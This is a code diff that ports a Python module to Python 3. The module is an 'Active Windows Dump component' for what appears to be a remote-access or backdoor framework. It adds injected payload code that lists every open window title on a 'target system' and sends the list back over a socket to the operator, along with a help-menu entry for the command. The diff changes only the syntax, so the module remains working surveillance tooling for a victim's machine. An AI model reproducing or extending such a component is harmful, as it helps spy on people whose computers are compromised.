@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -21,14 +20,14 @@ def active():
         if win.get_wm_name():
             tmp_list.append('   - ' + win.get_wm_name())
     tmp_list = list(set(tmp_list))
-    s.sendall(data + '\\n'.join(tmp_list) + '\\n')''')
+    s.sendall((data + '\\n'.join(tmp_list) + '\\n').encode())''')
         config.logics.append('''
             elif command == "active":
                 active()''')
         config.help_menu['active'] = 'Shows all open windows on the target system'
     elif option == 'info':
-        print '\nName             : Active Windows Dump component' \
+        print('\nName             : Active Windows Dump component' \
               '\nOS               : Linux' \
               '\nRequired Modules : python-xlib (external)' \
               '\nCommands         : active' \
-              '\nDescription      : Shows all open windows on the target system\n'
+              '\nDescription      : Shows all open windows on the target system\n')
